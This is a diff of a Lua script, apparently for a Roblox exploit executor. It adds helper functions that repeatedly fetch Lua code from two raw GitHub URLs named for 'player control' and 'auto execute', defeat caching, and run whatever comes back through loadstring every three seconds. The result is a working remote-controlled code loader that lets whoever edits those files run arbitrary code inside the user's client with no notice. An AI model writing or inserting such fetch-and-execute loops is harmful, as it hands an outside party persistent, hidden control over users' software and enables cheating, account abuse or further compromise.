@@ -14,24 +14,47 @@
 
 
 
-local scriptUrl = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
+local URLLINKS = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
+local ANTISPAMS = ""
 
-local lastContent = ""
+local function LATESS(url)
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    local fullUrl = url .. "?v=" .. tick()
+    
+    if req then
+        local success, res = pcall(function()
+            return req({
+                Url = fullUrl,
+                Method = "GET",
+                Headers = {
+                    ["Cache-Control"] = "no-cache, no-store, must-revalidate",
+                    ["Pragma"] = "no-cache"
+                }
+            })
+        end)
+        if success and res and res.Success then 
+            return res.Body 
+        end
+    end
+    
+    local success, content = pcall(function()
+        return game:HttpGet(fullUrl)
+    end)
+    
+    return success and content or nil
+end
 
 task.spawn(function()
     while true do
-        local success, content = pcall(function()
-            return game:HttpGet(scriptUrl)
-        end)
+        local content = LATESS(URLLINKS)
         
-        if success and content and content:match("%S") and content ~= lastContent then
-            lastContent = content
-            pcall(function()
-                local loadedFunc = loadstring(content)
-                if loadedFunc then
-                    loadedFunc()
-                end
-            end)
+        if content and content:match("%S") and content ~= ANTISPAMS then
+            ANTISPAMS = content
+            
+            local success, loadedFunc = pcall(loadstring, content)
+            if success and loadedFunc then
+                pcall(loadedFunc)
+            end
         end
         
         task.wait(3)
@@ -71,24 +94,47 @@ end)
 
 
 
-local autoexecutes = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/auto_execute_player.lua"
+local URLLINK = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/auto_execute_player.lua"
+local ANTISPAM = ""
 
-local lastContent1 = ""
+local function lates(url)
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    local fullUrl = url .. "?v=" .. tick()
+    
+    if req then
+        local success, res = pcall(function()
+            return req({
+                Url = fullUrl,
+                Method = "GET",
+                Headers = {
+                    ["Cache-Control"] = "no-cache, no-store, must-revalidate",
+                    ["Pragma"] = "no-cache"
+                }
+            })
+        end)
+        if success and res and res.Success then 
+            return res.Body 
+        end
+    end
+    
+    local success, content = pcall(function()
+        return game:HttpGet(fullUrl)
+    end)
+    
+    return success and content or nil
+end
 
 task.spawn(function()
     while true do
-        local success, content = pcall(function()
-            return game:HttpGet(autoexecutes)
-        end)
+        local content = lates(URLLINK)
         
-        if success and content and content:match("%S") and content ~= lastContent1 then
-            lastContent1 = content
-            pcall(function()
-                local loadedFunc = loadstring(content)
-                if loadedFunc then
-                    loadedFunc()
-                end
-            end)
+        if content and content:match("%S") and content ~= ANTISPAM then
+            ANTISPAM = content
+            
+            local success, loadedFunc = pcall(loadstring, content)
+            if success and loadedFunc then
+                pcall(loadedFunc)
+            end
         end
         
         task.wait(3)
@@ -293,7 +339,6 @@ end
 
 
 ---------------------------------------------------------------------------------------
-
 
 
 
